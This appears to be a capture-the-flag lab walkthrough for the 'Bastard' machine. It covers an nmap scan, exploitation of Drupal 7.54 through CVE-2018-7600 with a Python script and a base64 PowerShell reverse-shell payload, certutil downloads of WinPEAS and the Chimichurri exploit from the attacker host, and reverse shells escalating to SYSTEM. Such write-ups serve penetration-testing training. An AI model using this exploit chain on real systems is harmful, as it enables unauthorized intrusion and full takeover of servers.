
## Full TCP Port Scan (Aggressive) [230s]

```bash
sudo nmap -Pn -p- -A -T4 10.129.117.10
```

```text
Starting Nmap 7.95 (https://nmap.org) at 2025-03-18 12:40 EDT
Nmap scan report for 10.129.117.10
Host is up (0.15s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Welcome to Bastard | Bastard
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-generator: Drupal 7 (http://drupal.org)
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|2012|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 135/tcp)
HOP RTT       ADDRESS
1   154.12 ms 10.10.16.1
2   217.12 ms 10.129.117.10

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 230.40 seconds
```

## Enumeration

### Port 80 (HTTP - Drupal 7.54)
- Drupal version confirmed via `/CHANGELOG.txt` 
- Admin user identified on login page
- Robots.txt reveals sensitive paths
- Vulnerable to CVE-2018-7600 (Drupalgeddon2) 

```bash
curl -s http://10.129.117.10/CHANGELOG.txt | head -n 5
```
```text
Drupal 7.54, 2017-02-01
- Modules are now able to define theme engines (API addition:
  https://www.drupal.org/node/2826480).
- Logging of searches can now be disabled (new option in the administrative
  interface).
```

## Exploitation

### Initial Access via CVE-2018-7600
Modified exploit script from [FireFart's GitHub](https://github.com/firefart/CVE-2018-7600):
```python
#!/usr/bin/env python3
import requests
import re

HOST="http://10.129.117.10/"
# PowerShell reverse shell payload (Base64 encoded)
payload = "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdw..."  

get_params = {
    'q':'user/password',
    'name[#post_render][]':'passthru',
    'name[#markup]':payload,
    'name[#type]':'markup'
}
post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
r = requests.post(HOST, data=post_params, params=get_params)

m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
if m:
    found = m.group(1)
    get_params = {'q':'file/ajax/name/#value/' + found}
    post_params = {'form_build_id':found}
    r = requests.post(HOST, data=post_params, params=get_params)
    print(r.text)
```

Start listener:
```bash
nc -lvnp 1234
```

Execute exploit:
```bash
python3 drupalgeddon2.py
```

Reverse shell connection:
```text
connect to [10.10.16.27] from (UNKNOWN) [10.129.117.10] 50657
PS C:\inetpub\drupal-7.54> whoami
nt authority\iusr
```

### User Flag
Located in dimitris' desktop:
```powershell
PS C:\inetpub\drupal-7.54> type C:\Users\dimitris\Desktop\user.txt
8ac10b92...
```

## Privilege Escalation

### System Analysis
- Windows Version: Server 2008 R2 (6.1.7600) 
- Vulnerable to MS10-059 (Chimichurri) 

### WinPEAS Execution
Transfer and run WinPEAS:
```powershell
certutil -urlcache -f http://10.10.16.27:8888/winPEAS.bat win.bat
Start-Process -FilePath .\win.bat -RedirectStandardOutput C:\inetpub\drupal-7.54\winpeas.txt -NoNewWindow -Wait
```

Retrieve results:
```bash
wget http://10.129.117.10/winpeas.txt
```

### Privilege Escalation Execution
Transfer Chimichurri exploit:
```powershell
certutil -urlcache -f http://10.10.16.27:8888/Chimichurri.exe chimi.exe
```

Start elevated listener:
```bash
nc -lvnp 4444
```

Execute exploit:
```powershell
Start-Process -FilePath ".\chimi.exe" -ArgumentList "10.10.16.27 4444"
```

### Root Shell
```text
connect to [10.10.16.27] from (UNKNOWN) [10.129.117.10] 50716
Microsoft Windows [Version 6.1.7600]
C:\inetpub\drupal-7.54> whoami
nt authority\system
```

### Root Flag
Located in Administrator's desktop:
```cmd
C:\Users\Administrator\Desktop> type root.txt
9af71******************
```
